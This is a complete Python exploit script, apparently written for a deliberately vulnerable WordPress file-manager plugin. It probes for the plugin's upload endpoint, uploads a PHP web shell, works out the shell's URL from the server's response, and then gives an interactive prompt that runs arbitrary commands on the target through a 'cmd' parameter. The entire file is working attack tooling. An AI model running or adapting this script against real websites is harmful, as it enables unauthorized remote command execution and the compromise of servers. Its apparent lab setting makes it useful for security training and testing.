#!/usr/bin/env python3
import requests
import argparse
import sys
import os
import re
import readline  # nicer input editing

# --- Configurable defaults ---
DEFAULT_TIMEOUT = 10

# --- Helpers ---
def detect_plugin_path(target):
    common_paths = [
        "wp-file-manager-unsafe",
        "file-manager-unsafe",
        "wp-filemanager-unsafe",
        "wp-unsafe-filemanager",
    ]
    print("[*] Detecting plugin path...")
    for p in common_paths:
        url = f"{target}/wp-content/plugins/{p}/Adrie-file-manager.php"
        try:
            r = requests.get(url, timeout=DEFAULT_TIMEOUT)
        except Exception:
            continue
        if r.status_code == 200 and ("Upload" in r.text or "<form" in r.text):
            print(f"[+] Found plugin endpoint: {url}")
            return p
    print("[!] Could not detect plugin directory automatically.")
    return None

def extract_server_path(response_text):
    # try to find absolute server path like /var/www/html/...
    m = re.search(r"(/var/www/html/[^\s'\"<>]+\.php)", response_text)
    if m:
        return m.group(1).strip()
    # fallback: try to catch relative path after "Uploaded to:"
    m2 = re.search(r"Uploaded to:\s*([^\s<]+)", response_text)
    if m2:
        return m2.group(1).split("<")[0].strip()
    return None

def convert_path_to_url(target, server_path):
    if "/wp-content/" in server_path:
        rel = server_path.split("/wp-content/")[1]
        return f"{target}/wp-content/{rel}"
    # as last resort, strip /var/www/html
    if server_path.startswith("/var/www/html"):
        rel = server_path.replace("/var/www/html", "")
        return f"{target}{rel}"
    return None

def upload_shell(target, plugin_dir, file_path):
    endpoint = f"{target}/wp-content/plugins/{plugin_dir}/Adrie-file-manager.php"
    print(f"[*] Uploading shell to: {endpoint}")

    if not os.path.exists(file_path):
        print("[!] Shell file not found:", file_path)
        sys.exit(1)

    files = {"file": (os.path.basename(file_path), open(file_path, "rb"))}
    try:
        r = requests.post(endpoint, files=files, timeout=DEFAULT_TIMEOUT)
    except Exception as e:
        print("[!] Request error:", e)
        sys.exit(1)

    if r.status_code not in (200, 201):
        print(f"[!] Unexpected HTTP status: {r.status_code}")
        print(r.text[:1000])
        return None

    server_path = extract_server_path(r.text)
    if not server_path:
        # try to clean HTML that may contain path
        cleaned = re.sub(r"<[^>]+>", "", r.text).strip()
        m = re.search(r"(/var/www/html/[^\s]+\.php)", cleaned)
        if m:
            server_path = m.group(1).strip()
    if not server_path:
        print("[!] Unable to extract upload path from response. Response below:")
        print(r.text[:2000])
        return None

    print(f"[+] Server reported upload path: {server_path}")
    shell_url = convert_path_to_url(target, server_path)
    if not shell_url:
        print("[!] Could not convert server path to URL.")
        return None
    return shell_url

def try_run_cmd(shell_url, cmd):
    # try GET first, then POST fallback
    try:
        r = requests.get(shell_url, params={"cmd": cmd}, timeout=DEFAULT_TIMEOUT)
        if r.status_code == 200 and r.text.strip():
            return r.text.strip()
    except Exception:
        pass
    try:
        r = requests.post(shell_url, data={"cmd": cmd}, timeout=DEFAULT_TIMEOUT)
        if r.status_code == 200:
            return r.text.strip()
    except Exception as e:
        return f"[!] Request error: {e}"
    return None

def interactive_shell(shell_url):
    print("\n[*] Entering interactive mode. Type 'exit' or Ctrl+C to quit.")
    try:
        while True:
            cmd = input("cmd> ").strip()
            if not cmd:
                continue
            if cmd.lower() in ("exit", "quit"):
                break
            out = try_run_cmd(shell_url, cmd)
            if out is None:
                print("[!] No response or empty output.")
            else:
                print(out)
    except KeyboardInterrupt:
        print("\n[*] Exiting interactive shell.")

# --- Main ---
def main():
    parser = argparse.ArgumentParser(description="Exploit WP File Manager Unsafe Plugin (interactive)")
    parser.add_argument("file", help="PHP payload file to upload (example: shell.php)")
    parser.add_argument("--url", required=True, help="Target base URL (example: http://localhost:9999)")
    args = parser.parse_args()

    target = args.url.rstrip("/")
    plugin_dir = detect_plugin_path(target)
    if not plugin_dir:
        print("[!] Detection failed. You can pass plugin dir manually by modifying the script.")
        sys.exit(1)

    shell_url = upload_shell(target, plugin_dir, args.file)
    if not shell_url:
        print("[!] Upload failed.")
        sys.exit(1)

    print(f"[+] Shell is at: {shell_url}")
    print("[*] Running quick 'whoami' test...")
    whoami = try_run_cmd(shell_url, "whoami")
    if whoami:
        print("[+] whoami:", whoami)
    else:
        print("[!] whoami returned no output or shell did not respond.")

    interactive_shell(shell_url)
    print("[*] Done.")

if __name__ == "__main__":
    main()
